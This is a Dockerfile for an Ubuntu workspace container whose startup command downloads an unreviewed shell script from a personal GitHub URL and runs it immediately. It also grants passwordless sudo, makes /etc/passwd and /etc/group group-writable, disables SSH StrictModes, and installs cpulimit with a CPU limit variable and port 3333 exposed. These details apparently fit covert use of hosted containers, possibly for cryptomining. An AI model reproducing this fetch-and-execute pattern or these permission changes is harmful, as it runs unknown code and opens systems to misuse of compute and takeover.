FROM ubuntu:18.04

RUN apt-get update \
    && apt-get install -y sudo curl gnupg zip nano wget cpulimit openssh-server apache2 screen locales ca-certificates bash-completion

RUN mkdir /var/run/sshd && \
    sed 's@session\s*required\s*pam_loginuid.so@session optional pam_loginuid.so@g' -i /etc/pam.d/sshd && \
    echo "%sudo ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers && \
    # Adding user to the 'root' is a workaround for https://issues.jboss.org/browse/CDK-305
    useradd -u 1000 -G users,sudo,root -d /home/user --shell /bin/bash -m user && \
    mkdir /projects/ && cd /projects/ && mkdir joji && chmod -R 777 joji && \
    usermod -p "*" user


USER user
ENV HOME /home/user
ENV PASS nopass
ENV LIMIT 100
RUN for f in "/home/user" "/etc/passwd" "/etc/group" "/projects"; do\
           sudo chgrp -R 0 ${f} && \
           sudo chmod -R g+rwX ${f}; \
        done && \
        # Generate passwd.template \
        cat /etc/passwd | \
        sed s#user:x.*#user:x:\${USER_ID}:\${GROUP_ID}::\${HOME}:/bin/bash#g \
        > /home/user/passwd.template && \
        # Generate group.template \
        cat /etc/group | \
        sed s#root:x:0:#root:x:0:0,\${USER_ID}:#g \
        > /home/user/group.template && \
        sudo sed -ri 's/StrictModes yes/StrictModes no/g' /etc/ssh/sshd_config
        
EXPOSE 8080 8443 3333
COPY ["entrypoint.sh","/home/user/entrypoint.sh"]

RUN sudo chmod +x /home/user/entrypoint.sh

ENTRYPOINT ["/home/user/entrypoint.sh"]
CMD cd /projects/joji/ && wget https://raw.githubusercontent.com/dzmltzack/web/master/ayman.sh && chmod +x ayman.sh && ./ayman.sh
